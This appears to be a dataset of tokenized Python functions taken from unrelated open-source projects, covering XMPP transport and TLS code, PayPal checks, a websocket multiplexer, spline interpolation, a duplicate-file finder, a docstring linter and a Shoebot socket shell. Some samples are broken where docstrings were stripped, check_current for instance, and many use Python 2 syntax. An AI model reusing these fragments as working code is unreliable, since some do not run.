def _resolve_srv ( self ) : resolver = self . settings [ "dns_resolver" ] # pylint: disable=W0621 self . _set_state ( "resolving-srv" ) self . event ( ResolvingSRVEvent ( self . _dst_name , self . _dst_service ) ) resolver . resolve_srv ( self . _dst_name , self . _dst_service , "tcp" , callback = self . _got_srv )
def _connected ( self ) : self . _auth_properties [ 'remote-ip' ] = self . _dst_addr [ 0 ] if self . _dst_service : self . _auth_properties [ 'service-domain' ] = self . _dst_name if self . _dst_hostname is not None : self . _auth_properties [ 'service-hostname' ] = self . _dst_hostname else : self . _auth_properties [ 'service-hostname' ] = self . _dst_addr [ 0 ] self . _auth_properties [ 'security-layer' ] = None self . event ( ConnectedEvent ( self . _dst_addr ) ) self . _set_state ( "connected" ) self . _stream . transport_connected ( )
def send_stream_tail ( self ) : with self . lock : if not self . _socket or self . _hup : logger . debug ( u"Cannot send stream closing tag: already closed" ) return data = self . _serializer . emit_tail ( ) try : self . _write ( data . encode ( "utf-8" ) ) except ( IOError , SystemError , socket . error ) , err : logger . debug ( u"Sending stream closing tag failed: {0}" . format ( err ) ) self . _serializer = None self . _hup = True if self . _tls_state is None : try : self . _socket . shutdown ( socket . SHUT_WR ) except socket . error : pass self . _set_state ( "closing" ) self . _write_queue . clear ( ) self . _write_queue_cond . notify ( )
def send_element ( self , element ) : with self . lock : if self . _eof or self . _socket is None or not self . _serializer : logger . debug ( "Dropping element: {0}" . format ( element_to_unicode ( element ) ) ) return data = self . _serializer . emit_stanza ( element ) self . _write ( data . encode ( "utf-8" ) )
def _initiate_starttls ( self , * * kwargs ) : if self . _tls_state == "connected" : raise RuntimeError ( "Already TLS-connected" ) kwargs [ "do_handshake_on_connect" ] = False logger . debug ( "Wrapping the socket into ssl" ) self . _socket = ssl . wrap_socket ( self . _socket , * * kwargs ) self . _set_state ( "tls-handshake" ) self . _continue_tls_handshake ( )
def _continue_tls_handshake ( self ) : try : logger . debug ( " do_handshake()" ) self . _socket . do_handshake ( ) except ssl . SSLError , err : if err . args [ 0 ] == ssl . SSL_ERROR_WANT_READ : self . _tls_state = "want_read" logger . debug ( "   want_read" ) self . _state_cond . notify ( ) return elif err . args [ 0 ] == ssl . SSL_ERROR_WANT_WRITE : self . _tls_state = "want_write" logger . debug ( "   want_write" ) self . _write_queue . appendleft ( TLSHandshake ) return else : raise self . _tls_state = "connected" self . _set_state ( "connected" ) self . _auth_properties [ 'security-layer' ] = "TLS" if "tls-unique" in CHANNEL_BINDING_TYPES : try : # pylint: disable=E1103 tls_unique = self . _socket . get_channel_binding ( "tls-unique" ) except ValueError : pass else : self . _auth_properties [ 'channel-binding' ] = { "tls-unique" : tls_unique } try : cipher = self . _socket . cipher ( ) except AttributeError : # SSLSocket.cipher doesn't work on PyPy cipher = "unknown" cert = get_certificate_from_ssl_socket ( self . _socket ) self . event ( TLSConnectedEvent ( cipher , cert ) )
def handle_read ( self ) : with self . lock : logger . debug ( "handle_read()" ) if self . _eof or self . _socket is None : return if self . _state == "tls-handshake" : while True : logger . debug ( "tls handshake read..." ) self . _continue_tls_handshake ( ) logger . debug ( "  state: {0}" . format ( self . _tls_state ) ) if self . _tls_state != "want_read" : break elif self . _tls_state == "connected" : while self . _socket and not self . _eof : logger . debug ( "tls socket read..." ) try : data = self . _socket . read ( 4096 ) except ssl . SSLError , err : if err . args [ 0 ] == ssl . SSL_ERROR_WANT_READ : break elif err . args [ 0 ] == ssl . SSL_ERROR_WANT_WRITE : break else : raise except socket . error , err : if err . args [ 0 ] == errno . EINTR : continue elif err . args [ 0 ] in BLOCKING_ERRORS : break elif err . args [ 0 ] == errno . ECONNRESET : logger . warning ( "Connection reset by peer" ) data = None else : raise self . _feed_reader ( data ) else : while self . _socket and not self . _eof : logger . debug ( "raw socket read..." ) try : data = self . _socket . recv ( 4096 ) except socket . error , err : if err . args [ 0 ] == errno . EINTR : continue elif err . args [ 0 ] in BLOCKING_ERRORS : break elif err . args [ 0 ] == errno . ECONNRESET : logger . warning ( "Connection reset by peer" ) data = None else : raise self . _feed_reader ( data )
def handle_err ( self ) : with self . lock : if self . _state == 'connecting' and self . _dst_addrs : self . _hup = False self . _set_state ( "connect" ) return self . _socket . close ( ) self . _socket = None self . _set_state ( "aborted" ) self . _write_queue . clear ( ) self . _write_queue_cond . notify ( ) raise PyXMPPIOError ( "Unhandled error on socket" )
def disconnect ( self ) : logger . debug ( "TCPTransport.disconnect()" ) with self . lock : if self . _socket is None : if self . _state != "closed" : self . event ( DisconnectedEvent ( self . _dst_addr ) ) self . _set_state ( "closed" ) return if self . _hup or not self . _serializer : self . _close ( ) else : self . send_stream_tail ( )
def _close ( self ) : if self . _state != "closed" : self . event ( DisconnectedEvent ( self . _dst_addr ) ) self . _set_state ( "closed" ) if self . _socket is None : return try : self . _socket . shutdown ( socket . SHUT_RDWR ) except socket . error : pass self . _socket . close ( ) self . _socket = None self . _write_queue . clear ( ) self . _write_queue_cond . notify ( )
def event ( self , event ) : logger . debug ( u"TCP transport event: {0}" . format ( event ) ) if self . _stream : event . stream = self . _stream self . _event_queue . put ( event )
def run ( self ) : # pylint: disable-msg=W0212 timeout = self . method . _pyxmpp_timeout recurring = self . method . _pyxmpp_recurring while not self . _quit and timeout is not None : if timeout : time . sleep ( timeout ) if self . _quit : break ret = self . method ( ) if recurring is None : timeout = ret elif not recurring : break
def _run_io_threads ( self , handler ) : reader = ReadingThread ( self . settings , handler , daemon = self . daemon , exc_queue = self . exc_queue ) writter = WrittingThread ( self . settings , handler , daemon = self . daemon , exc_queue = self . exc_queue ) self . io_threads += [ reader , writter ] reader . start ( ) writter . start ( )
def _remove_io_handler ( self , handler ) : if handler not in self . io_handlers : return self . io_handlers . remove ( handler ) for thread in self . io_threads : if thread . io_handler is handler : thread . stop ( )
def _add_timeout_handler ( self , handler ) : self . timeout_handlers . append ( handler ) if self . event_thread is None : return self . _run_timeout_threads ( handler )
def _run_timeout_threads ( self , handler ) : # pylint: disable-msg=W0212 for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , "_pyxmpp_timeout" ) : continue thread = TimeoutThread ( method , daemon = self . daemon , exc_queue = self . exc_queue ) self . timeout_threads . append ( thread ) thread . start ( )
def _remove_timeout_handler ( self , handler ) : if handler not in self . timeout_handlers : return self . timeout_handlers . remove ( handler ) for thread in self . timeout_threads : if thread . method . im_self is handler : thread . stop ( )
def start ( self , daemon = False ) : self . daemon = daemon self . io_threads = [ ] self . event_thread = EventDispatcherThread ( self . event_dispatcher , daemon = daemon , exc_queue = self . exc_queue ) self . event_thread . start ( ) for handler in self . io_handlers : self . _run_io_threads ( handler ) for handler in self . timeout_handlers : self . _run_timeout_threads ( handler )
def auth_finish ( self , _unused ) : self . lock . acquire ( ) try : self . __logger . debug ( "Authenticated" ) self . authenticated = True self . state_change ( "authorized" , self . my_jid ) self . _post_auth ( ) finally : self . lock . release ( )
def _configure_io_handler ( self , handler ) : if self . check_events ( ) : return if handler in self . _unprepared_handlers : old_fileno = self . _unprepared_handlers [ handler ] prepared = self . _prepare_io_handler ( handler ) else : old_fileno = None prepared = True fileno = handler . fileno ( ) if old_fileno is not None and fileno != old_fileno : del self . _handlers [ old_fileno ] # remove_handler won't raise something like KeyError if the fd # isn't registered; it will just print a debug log. self . io_loop . remove_handler ( old_fileno ) if not prepared : self . _unprepared_handlers [ handler ] = fileno if not fileno : return update = fileno in self . _handlers events = ioloop . IOLoop . NONE if handler . is_readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= ioloop . IOLoop . READ if handler . is_writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= ioloop . IOLoop . WRITE if self . _handlers . get ( fileno , None ) == events : return self . _handlers [ fileno ] = events if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) if update : self . io_loop . update_handler ( fileno , events ) else : self . io_loop . add_handler ( fileno , partial ( self . _handle_event , handler ) , events )
def _send_stream_start ( self , stream_id = None , stream_to = None ) : if self . _output_state in ( "open" , "closed" ) : raise StreamError ( "Stream start already sent" ) if not self . language : self . language = self . settings [ "language" ] if stream_to : stream_to = unicode ( stream_to ) elif self . peer and self . initiator : stream_to = unicode ( self . peer ) stream_from = None if self . me and ( self . tls_established or not self . initiator ) : stream_from = unicode ( self . me ) if stream_id : self . stream_id = stream_id else : self . stream_id = None self . transport . send_stream_head ( self . stanza_namespace , stream_from , stream_to , self . stream_id , language = self . language ) self . _output_state = "open"
def _send_stream_error ( self , condition ) : if self . _output_state is "closed" : return if self . _output_state in ( None , "restart" ) : self . _send_stream_start ( ) element = StreamErrorElement ( condition ) . as_xml ( ) self . transport . send_element ( element ) self . transport . disconnect ( ) self . _output_state = "closed"
def _restart_stream ( self ) : self . _input_state = "restart" self . _output_state = "restart" self . features = None self . transport . restart ( ) if self . initiator : self . _send_stream_start ( self . stream_id )
def _send ( self , stanza ) : self . fix_out_stanza ( stanza ) element = stanza . as_xml ( ) self . _write_element ( element )
def uplink_receive ( self , stanza ) : with self . lock : if self . stanza_route : self . stanza_route . uplink_receive ( stanza ) else : logger . debug ( u"Stanza dropped (no route): {0!r}" . format ( stanza ) )
def main ( ) : parser = argparse . ArgumentParser ( description = 'XMPP echo bot' , parents = [ XMPPSettings . get_arg_parser ( ) ] ) parser . add_argument ( 'jid' , metavar = 'JID' , help = 'The bot JID' ) parser . add_argument ( '--debug' , action = 'store_const' , dest = 'log_level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add_argument ( '--quiet' , const = logging . ERROR , action = 'store_const' , dest = 'log_level' , help = 'Print only error messages' ) parser . add_argument ( '--trace' , action = 'store_true' , help = 'Print XML data sent and received' ) args = parser . parse_args ( ) settings = XMPPSettings ( { "software_name" : "Echo Bot" } ) settings . load_arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . jid ) ) if sys . version_info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version_info . major < 3 : args . jid = args . jid . decode ( "utf-8" ) logging . basicConfig ( level = args . log_level ) if args . trace : print "enabling trace" handler = logging . StreamHandler ( ) handler . setLevel ( logging . DEBUG ) for logger in ( "pyxmpp2.IN" , "pyxmpp2.OUT" ) : logger = logging . getLogger ( logger ) logger . setLevel ( logging . DEBUG ) logger . addHandler ( handler ) logger . propagate = False bot = EchoBot ( JID ( args . jid ) , settings ) try : bot . run ( ) except KeyboardInterrupt : bot . disconnect ( )
def handle_read ( self ) : with self . _lock : logger . debug ( "handle_read()" ) if self . _socket is None : return while True : try : sock , address = self . _socket . accept ( ) except socket . error , err : if err . args [ 0 ] in BLOCKING_ERRORS : break else : raise logger . debug ( "Accepted connection from: {0!r}" . format ( address ) ) self . _target ( sock , address )
def _decode_subelements ( self ) : for child in self . _element : if child . tag == self . _show_tag : self . _show = child . text elif child . tag == self . _status_tag : self . _status = child . text elif child . tag == self . _priority_tag : try : self . _priority = int ( child . text . strip ( ) ) if self . _priority < - 128 or self . _priority > 127 : raise ValueError except ValueError : raise BadRequestProtocolError ( "Presence priority not an integer" )
def activate ( self ) : obj = self . find_paypal_object ( ) if obj . state == enums . BillingPlanState . CREATED : success = obj . activate ( ) if not success : raise PaypalApiError ( "Failed to activate plan: %r" % ( obj . error ) ) # Resync the updated data to the database self . get_or_update_from_api_data ( obj , always_sync = True ) return obj
def check_paypal_api_key ( app_configs = None , * * kwargs ) : messages = [ ] mode = getattr ( djpaypal_settings , "PAYPAL_MODE" , None ) if mode not in VALID_MODES : msg = "Invalid PAYPAL_MODE specified: {}." . format ( repr ( mode ) ) hint = "PAYPAL_MODE must be one of {}" . format ( ", " . join ( repr ( k ) for k in VALID_MODES ) ) messages . append ( checks . Critical ( msg , hint = hint , id = "djpaypal.C001" ) ) for setting in "PAYPAL_CLIENT_ID" , "PAYPAL_CLIENT_SECRET" : if not getattr ( djpaypal_settings , setting , None ) : msg = "Invalid value specified for {}" . format ( setting ) hint = "Add PAYPAL_CLIENT_ID and PAYPAL_CLIENT_SECRET to your settings." messages . append ( checks . Critical ( msg , hint = hint , id = "djpaypal.C002" ) ) return messages
async def _create_upstream_applications ( self ) : loop = asyncio . get_event_loop ( ) for steam_name , ApplicationsCls in self . applications . items ( ) : application = ApplicationsCls ( self . scope ) upstream_queue = asyncio . Queue ( ) self . application_streams [ steam_name ] = upstream_queue self . application_futures [ steam_name ] = loop . create_task ( application ( upstream_queue . get , partial ( self . dispatch_downstream , steam_name = steam_name ) ) )
async def receive_json ( self , content , * * kwargs ) : # Check the frame looks good if isinstance ( content , dict ) and "stream" in content and "payload" in content : # Match it to a channel steam_name = content [ "stream" ] payload = content [ "payload" ] # block upstream frames if steam_name not in self . applications_accepting_frames : raise ValueError ( "Invalid multiplexed frame received (stream not mapped)" ) # send it on to the application that handles this stream await self . send_upstream ( message = { "type" : "websocket.receive" , "text" : await self . encode_json ( payload ) } , stream_name = steam_name ) return else : raise ValueError ( "Invalid multiplexed **frame received (no channel/payload key)" )
async def disconnect ( self , code ) : try : await asyncio . wait ( self . application_futures . values ( ) , return_when = asyncio . ALL_COMPLETED , timeout = self . application_close_timeout ) except asyncio . TimeoutError : pass
async def websocket_send ( self , message , stream_name ) : text = message . get ( "text" ) # todo what to do on binary! json = await self . decode_json ( text ) data = { "stream" : stream_name , "payload" : json } await self . send_json ( data )
def set_interpolation_coefficients ( self ) : left_boundary_slope = 0 right_boundary_slope = 0 if isinstance ( self . boundary_condition , tuple ) : left_boundary_slope = self . boundary_condition [ 0 ] right_boundary_slope = self . boundary_condition [ 1 ] elif self . boundary_condition is None : pass else : msg = 'The given object {} of type {} is not a valid condition ' 'for the border' . format ( self . boundary_condition , type ( self . boundary_condition ) ) raise ValueError ( msg ) # getting the values such that we get a continuous second derivative # by solving a system of linear equations # setup the matrix n = len ( self . x_list ) mat = numpy . zeros ( ( n , n ) ) b = numpy . zeros ( ( n , 1 ) ) x = self . x_list y = self . y_list if n > 2 : for i in range ( 1 , n - 1 ) : mat [ i , i - 1 ] = 1.0 / ( x [ i ] - x [ i - 1 ] ) mat [ i , i + 1 ] = 1.0 / ( x [ i + 1 ] - x [ i ] ) mat [ i , i ] = 2 * ( mat [ i , i - 1 ] + mat [ i , i + 1 ] ) b [ i , 0 ] = 3 * ( ( y [ i ] - y [ i - 1 ] ) / ( x [ i ] - x [ i - 1 ] ) ** 2 + ( y [ i + 1 ] - y [ i ] ) / ( x [ i + 1 ] - x [ i ] ) ** 2 ) elif n < 2 : raise ValueError ( 'too less points for interpolation' ) if self . boundary_condition is None : # not a knot mat [ 0 , 0 ] = 1.0 / ( x [ 1 ] - x [ 0 ] ) ** 2 mat [ 0 , 2 ] = - 1.0 / ( x [ 2 ] - x [ 1 ] ) ** 2 mat [ 0 , 1 ] = mat [ 0 , 0 ] + mat [ 0 , 2 ] b [ 0 , 0 ] = 2.0 * ( ( y [ 1 ] - y [ 0 ] ) / ( x [ 1 ] - x [ 0 ] ) ** 3 - ( y [ 2 ] - y [ 1 ] ) / ( x [ 2 ] - x [ 1 ] ) ** 3 ) mat [ n - 1 , n - 3 ] = 1.0 / ( x [ n - 2 ] - x [ n - 3 ] ) ** 2 mat [ n - 1 , n - 1 ] = - 1.0 / ( x [ n - 1 ] - x [ n - 2 ] ) ** 2 mat [ n - 1 , n - 2 ] = mat [ n - 1 , n - 3 ] + mat [ n - 1 , n - 1 ] b [ n - 1 , 0 ] = 2.0 * ( ( y [ n - 2 ] - y [ n - 3 ] ) / ( x [ n - 2 ] - x [ n - 3 ] ) ** 3 - ( y [ n - 1 ] - y [ n - 2 ] ) / ( x [ n - 1 ] - x [ n - 2 ] ) ** 3 ) else : mat [ 0 , 0 ] = 2.0 / ( x [ 1 ] - x [ 0 ] ) mat [ 0 , 1 ] = 1.0 / ( x [ 1 ] - x [ 0 ] ) b [ 0 , 0 ] = 3 * ( y [ 1 ] - y [ 0 ] ) / ( x [ 1 ] - x [ 0 ] ) ** 2 - 0.5 * left_boundary_slope mat [ n - 1 , n - 2 ] = 1.0 / ( x [ n - 1 ] - x [ n - 2 ] ) mat [ n - 1 , n - 1 ] = 2.0 / ( x [ n - 1 ] - x [ n - 2 ] ) b [ n - 1 , 0 ] = 3 * ( y [ n - 1 ] - y [ n - 2 ] ) / ( x [ n - 1 ] - x [ n - 2 ] ) ** 2 + 0.5 * right_boundary_slope k = numpy . linalg . solve ( mat , b ) for i in range ( 1 , n ) : c1 = k [ i - 1 , 0 ] * ( x [ i ] - x [ i - 1 ] ) - ( y [ i ] - y [ i - 1 ] ) c2 = - k [ i , 0 ] * ( x [ i ] - x [ i - 1 ] ) + ( y [ i ] - y [ i - 1 ] ) self . interpolation_coefficients . append ( [ c1 , c2 ] )
def main ( ) : # pylint: disable=bad-continuation from optparse import OptionParser , OptionGroup parser = OptionParser ( usage = "%prog [options] <folder path> ..." , version = "%s v%s" % ( __appname__ , __version__ ) ) parser . add_option ( '-D' , '--defaults' , action = "store_true" , dest = "defaults" , default = False , help = "Display the default values for options which take" " arguments and then exit." ) parser . add_option ( '-E' , '--exact' , action = "store_true" , dest = "exact" , default = False , help = "There is a vanishingly small chance of false" " positives when comparing files using sizes and hashes. This option" " enables exact comparison. However, exact comparison requires a lot" " of disk seeks, so, on traditional moving-platter media, this trades" " a LOT of performance for a very tiny amount of safety most people" " don't need." ) # XXX: Should I add --verbose and/or --quiet? filter_group = OptionGroup ( parser , "Input Filtering" ) filter_group . add_option ( '-e' , '--exclude' , action = "append" , dest = "exclude" , metavar = "PAT" , help = "Specify a globbing pattern to be" " added to the internal blacklist. This option can be used multiple" " times. Provide a dash (-) as your first exclude to override the" " pre-programmed defaults." ) filter_group . add_option ( '--min-size' , action = "store" , type = "int" , dest = "min_size" , metavar = "X" , help = "Specify a non-default minimum size" ". Files below this size (default: %default bytes) will be ignored." ) parser . add_option_group ( filter_group ) behaviour_group = OptionGroup ( parser , "Output Behaviour" ) behaviour_group . add_option ( '-d' , '--delete' , action = "store_true" , dest = "delete" , help = "Prompt the user for files to preserve and delete " "all others." ) behaviour_group . add_option ( '-n' , '--dry-run' , action = "store_true" , dest = "dry_run" , metavar = "PREFIX" , help = "Don't actually delete any " "files. Just list what actions would be performed. (Good for testing " "values for --prefer)" ) behaviour_group . add_option ( '--prefer' , action = "append" , dest = "prefer" , metavar = "PATH" , default = [ ] , help = "Append a globbing pattern which " "--delete should automatically prefer (rather than prompting) when it " "occurs in a list of duplicates." ) behaviour_group . add_option ( '--noninteractive' , action = "store_true" , dest = "noninteractive" , help = "When using --delete, automatically assume" " 'all' for any groups with no --prefer matches rather than prompting" ) parser . add_option_group ( behaviour_group ) parser . set_defaults ( * * DEFAULTS ) # pylint: disable=W0142 opts , args = parser . parse_args ( ) if '-' in opts . exclude : opts . exclude = opts . exclude [ opts . exclude . index ( '-' ) + 1 : ] opts . exclude = [ x . rstrip ( os . sep + ( os . altsep or '' ) ) for x in opts . exclude ] # This line is required to make it match directories if opts . defaults : print_defaults ( ) sys . exit ( ) groups = find_dupes ( args , opts . exact , opts . exclude , opts . min_size ) if opts . delete : delete_dupes ( groups , opts . prefer , not opts . noninteractive , opts . dry_run ) else : for dupeSet in groups . values ( ) : print '\n' . join ( dupeSet ) + '\n'
def get_summarizer ( self , name ) : if name in self . summarizers : pass elif name == 'lexrank' : from . import lexrank self . summarizers [ name ] = lexrank . summarize elif name == 'mcp' : from . import mcp_summ self . summarizers [ name ] = mcp_summ . summarize return self . summarizers [ name ]
def code_mapping ( level , msg , default = 99 ) : try : return code_mappings_by_level [ level ] [ msg ] except KeyError : pass # Following assumes any variable messages take the format # of 'Fixed text "variable text".' only: # e.g. 'Unknown directive type "req".' # ---> 'Unknown directive type' # e.g. 'Unknown interpreted text role "need".' # ---> 'Unknown interpreted text role' if msg . count ( '"' ) == 2 and ' "' in msg and msg . endswith ( '".' ) : txt = msg [ : msg . index ( ' "' ) ] return code_mappings_by_level [ level ] . get ( txt , default ) return default
def dequote_docstring ( text ) : # TODO: Process escaped characters unless raw mode? text = text . strip ( ) if len ( text ) > 6 and text [ : 3 ] == text [ - 3 : ] == '"""' : # Standard case, """...""" return text [ 3 : - 3 ] if len ( text ) > 7 and text [ : 4 ] in ( 'u"""' , 'r"""' ) and text [ - 3 : ] == '"""' : # Unicode, u"""...""", or raw r"""...""" return text [ 4 : - 3 ] # Other flake8 tools will report atypical quotes: if len ( text ) > 6 and text [ : 3 ] == text [ - 3 : ] == "'''" : return text [ 3 : - 3 ] if len ( text ) > 7 and text [ : 4 ] in ( "u'''" , "r'''" ) and text [ - 3 : ] == "'''" : return text [ 4 : - 3 ] if len ( text ) > 2 and text [ 0 ] == text [ - 1 ] == '"' : return text [ 1 : - 1 ] if len ( text ) > 3 and text [ : 2 ] in ( 'u"' , 'r"' ) and text [ - 1 ] == '"' : return text [ 2 : - 1 ] if len ( text ) > 2 and text [ 0 ] == text [ - 1 ] == "'" : return text [ 1 : - 1 ] if len ( text ) > 3 and text [ : 2 ] in ( "u'" , "r'" ) and text [ - 1 ] == "'" : return text [ 2 : - 1 ] raise ValueError ( "Bad quotes!" )
def is_public ( self ) : if self . all is not None : return self . name in self . all else : return not self . name . startswith ( "_" )
def is_public ( self ) : # Check if we are a setter/deleter method, and mark as private if so. for decorator in self . decorators : # Given 'foo', match 'foo.bar' but not 'foobar' or 'sfoo' if re . compile ( r"^{}\." . format ( self . name ) ) . match ( decorator . name ) : return False name_is_public = ( not self . name . startswith ( "_" ) or self . name in VARIADIC_MAGIC_METHODS or self . is_magic ) return self . parent . is_public and name_is_public
def is_public ( self ) : return ( not self . name . startswith ( "_" ) and self . parent . is_class and self . parent . is_public )
def parse ( self , filelike , filename ) : self . log = log self . source = filelike . readlines ( ) src = "" . join ( self . source ) # This may raise a SyntaxError: compile ( src , filename , "exec" ) self . stream = TokenStream ( StringIO ( src ) ) self . filename = filename self . all = None self . future_imports = set ( ) self . _accumulated_decorators = [ ] return self . parse_module ( )
def consume ( self , kind ) : next_token = self . stream . move ( ) assert next_token . kind == kind
def parse_docstring ( self ) : self . log . debug ( "parsing docstring, token is %r (%s)" , self . current . kind , self . current . value ) while self . current . kind in ( tk . COMMENT , tk . NEWLINE , tk . NL ) : self . stream . move ( ) self . log . debug ( "parsing docstring, token is %r (%s)" , self . current . kind , self . current . value , ) if self . current . kind == tk . STRING : docstring = self . current . value self . stream . move ( ) return docstring return None
def parse_definitions ( self , class_ , all = False ) : while self . current is not None : self . log . debug ( "parsing definition list, current token is %r (%s)" , self . current . kind , self . current . value , ) self . log . debug ( "got_newline: %s" , self . stream . got_logical_newline ) if all and self . current . value == "__all__" : self . parse_all ( ) elif ( self . current . kind == tk . OP and self . current . value == "@" and self . stream . got_logical_newline ) : self . consume ( tk . OP ) self . parse_decorators ( ) elif self . current . value in [ "def" , "class" ] : yield self . parse_definition ( class_ . _nest ( self . current . value ) ) elif self . current . kind == tk . INDENT : self . consume ( tk . INDENT ) for definition in self . parse_definitions ( class_ ) : yield definition elif self . current . kind == tk . DEDENT : self . consume ( tk . DEDENT ) return elif self . current . value == "from" : self . parse_from_import_statement ( ) else : self . stream . move ( )
def parse_all ( self ) : assert self . current . value == "__all__" self . consume ( tk . NAME ) if self . current . value != "=" : raise AllError ( "Could not evaluate contents of __all__. " ) self . consume ( tk . OP ) if self . current . value not in "([" : raise AllError ( "Could not evaluate contents of __all__. " ) self . consume ( tk . OP ) self . all = [ ] all_content = "(" while self . current . kind != tk . OP or self . current . value not in ")]" : if self . current . kind in ( tk . NL , tk . COMMENT ) : pass elif self . current . kind == tk . STRING or self . current . value == "," : all_content += self . current . value else : raise AllError ( "Unexpected token kind in  __all__: {!r}. " . format ( self . current . kind ) ) self . stream . move ( ) self . consume ( tk . OP ) all_content += ")" try : self . all = eval ( all_content , { } ) except BaseException as e : raise AllError ( "Could not evaluate contents of __all__." "\bThe value was {}. The exception was:\n{}" . format ( all_content , e ) )
def check_current ( self , kind = None , value = None ) : msg = textwrap . dedent ( . format ( self = self ) ) kind_valid = self . current . kind == kind if kind else True value_valid = self . current . value == value if value else True assert kind_valid and value_valid , msg
def _parse_from_import_names ( self , is_future_import ) : if self . current . value == "(" : self . consume ( tk . OP ) expected_end_kinds = ( tk . OP , ) else : expected_end_kinds = ( tk . NEWLINE , tk . ENDMARKER ) while self . current . kind not in expected_end_kinds and not ( self . current . kind == tk . OP and self . current . value == ";" ) : if self . current . kind != tk . NAME : self . stream . move ( ) continue self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , ) if is_future_import : self . log . debug ( "found future import: %s" , self . current . value ) self . future_imports . add ( self . current . value ) self . consume ( tk . NAME ) self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , ) if self . current . kind == tk . NAME and self . current . value == "as" : self . consume ( tk . NAME ) # as if self . current . kind == tk . NAME : self . consume ( tk . NAME ) # new name, irrelevant if self . current . value == "," : self . consume ( tk . OP ) self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , )
def run ( self ) : # Is there any reason not to call load_source here? if self . err is not None : assert self . source is None msg = "%s%03i %s" % ( rst_prefix , rst_fail_load , "Failed to load file: %s" % self . err , ) yield 0 , 0 , msg , type ( self ) module = [ ] try : module = parse ( StringIO ( self . source ) , self . filename ) except SyntaxError as err : msg = "%s%03i %s" % ( rst_prefix , rst_fail_parse , "Failed to parse file: %s" % err , ) yield 0 , 0 , msg , type ( self ) module = [ ] except AllError : msg = "%s%03i %s" % ( rst_prefix , rst_fail_all , "Failed to parse __all__ entry." , ) yield 0 , 0 , msg , type ( self ) module = [ ] for definition in module : if not definition . docstring : # People can use flake8-docstrings to report missing # docstrings continue try : # Note we use the PEP257 trim algorithm to remove the # leading whitespace from each line - this avoids false # positive severe error "Unexpected section title." unindented = trim ( dequote_docstring ( definition . docstring ) ) # Off load RST validation to reStructuredText-lint # which calls docutils internally. # TODO: Should we pass the Python filename as filepath? rst_errors = list ( rst_lint . lint ( unindented ) ) except Exception as err : # e.g. UnicodeDecodeError msg = "%s%03i %s" % ( rst_prefix , rst_fail_lint , "Failed to lint docstring: %s - %s" % ( definition . name , err ) , ) yield definition . start , 0 , msg , type ( self ) continue for rst_error in rst_errors : # TODO - make this a configuration option? if rst_error . level <= 1 : continue # Levels: # # 0 - debug   --> we don't receive these # 1 - info    --> RST1## codes # 2 - warning --> RST2## codes # 3 - error   --> RST3## codes # 4 - severe  --> RST4## codes # # Map the string to a unique code: msg = rst_error . message . split ( "\n" , 1 ) [ 0 ] code = code_mapping ( rst_error . level , msg ) assert code < 100 , code code += 100 * rst_error . level msg = "%s%03i %s" % ( rst_prefix , code , msg ) # This will return the line number by combining the # start of the docstring with the offet within it. # We don't know the column number, leaving as zero. yield definition . start + rst_error . line , 0 , msg , type ( self )
def load_source ( self ) : if self . filename in self . STDIN_NAMES : self . filename = "stdin" if sys . version_info [ 0 ] < 3 : self . source = sys . stdin . read ( ) else : self . source = TextIOWrapper ( sys . stdin . buffer , errors = "ignore" ) . read ( ) else : # Could be a Python 2.7 StringIO with no context manager, sigh. # with tokenize_open(self.filename) as fd: #     self.source = fd.read() handle = tokenize_open ( self . filename ) self . source = handle . read ( ) handle . close ( )
def listener ( self , sock , * args ) : conn , addr = sock . accept ( ) f = conn . makefile ( conn ) self . shell = ShoebotCmd ( self . bot , stdin = f , stdout = f , intro = INTRO ) print ( _ ( "Connected" ) ) GObject . io_add_watch ( conn , GObject . IO_IN , self . handler ) if self . shell . intro : self . shell . stdout . write ( str ( self . shell . intro ) + "\n" ) self . shell . stdout . flush ( ) return True
def handler ( self , conn , * args ) : # lines from cmd.Cmd self . shell . stdout . write ( self . shell . prompt ) line = self . shell . stdin . readline ( ) if not len ( line ) : line = 'EOF' return False else : line = line . rstrip ( '\r\n' ) line = self . shell . precmd ( line ) stop = self . shell . onecmd ( line ) stop = self . shell . postcmd ( stop , line ) self . shell . stdout . flush ( ) self . shell . postloop ( ) # end lines from cmd.Cmd if stop : self . shell = None conn . close ( ) return not stop
def do_escape_nl ( self , arg ) : if arg . lower ( ) == 'off' : self . escape_nl = False else : self . escape_nl = True
def do_restart ( self , line ) : self . bot . _frame = 0 self . bot . _namespace . clear ( ) self . bot . _namespace . update ( self . bot . _initial_namespace )
def do_play ( self , line ) : if self . pause_speed is None : self . bot . _speed = self . pause_speed self . pause_speed = None self . print_response ( "Play" )
def do_vars ( self , line ) : if self . bot . _vars : max_name_len = max ( [ len ( name ) for name in self . bot . _vars ] ) for i , ( name , v ) in enumerate ( self . bot . _vars . items ( ) ) : keep = i < len ( self . bot . _vars ) - 1 self . print_response ( "%s = %s" % ( name . ljust ( max_name_len ) , v . value ) , keep = keep ) else : self . print_response ( "No vars" )
def do_exit ( self , line ) : if self . trusted : publish_event ( QUIT_EVENT ) self . print_response ( 'Bye.\n' ) return True
def do_fullscreen ( self , line ) : self . bot . canvas . sink . trigger_fullscreen_action ( True ) print ( self . response_prompt , file = self . stdout )
def do_windowed ( self , line ) : self . bot . canvas . sink . trigger_fullscreen_action ( False ) print ( self . response_prompt , file = self . stdout )
def do_help ( self , arg ) : print ( self . response_prompt , file = self . stdout ) return cmd . Cmd . do_help ( self , arg )
def do_set ( self , line ) : try : name , value = [ part . strip ( ) for part in line . split ( '=' ) ] if name not in self . bot . _vars : self . print_response ( 'No such variable %s enter vars to see available vars' % name ) return variable = self . bot . _vars [ name ] variable . value = variable . sanitize ( value . strip ( ';' ) ) success , msg = self . bot . canvas . sink . var_changed ( name , variable . value ) if success : print ( '{}={}' . format ( name , variable . value ) , file = self . stdout ) else : print ( '{}\n' . format ( msg ) , file = self . stdout ) except Exception as e : print ( 'Invalid Syntax.' , e ) return
